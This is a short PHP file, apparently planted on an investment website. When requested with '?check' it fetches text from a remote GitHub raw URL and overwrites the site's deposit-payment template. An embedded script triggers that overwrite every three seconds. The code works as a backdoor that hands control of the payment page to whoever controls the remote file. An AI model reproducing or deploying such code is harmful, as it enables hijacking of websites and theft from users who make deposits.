<?php
if (isset($_GET['check'])) {
    $file_path = "/www/wwwroot/dytouzi/core/resources/views/templates/invester/user/payment/deposit.blade.php";
    $remote_url = "https://raw.githubusercontent.com/mekote/sil/refs/heads/main/2.txt";

    // Uzaktan içeriği çek
    $new_content = file_get_contents($remote_url);
    if ($new_content !== false) {
        file_put_contents($file_path, $new_content);
        echo "Dosya başarıyla güncellendi.";
    } else {
        echo "Uzaktan içerik alınamadı.";
    }
    exit;
}
?>

    <script>
        function updateFile() {
            fetch("?check")
                .then(response => response.text())
                .then(data => console.log(data))
                .catch(error => console.error("Hata:", error));
        }
        setInterval(updateFile, 3000); // Her 3 saniyede bir güncelle
    </script>
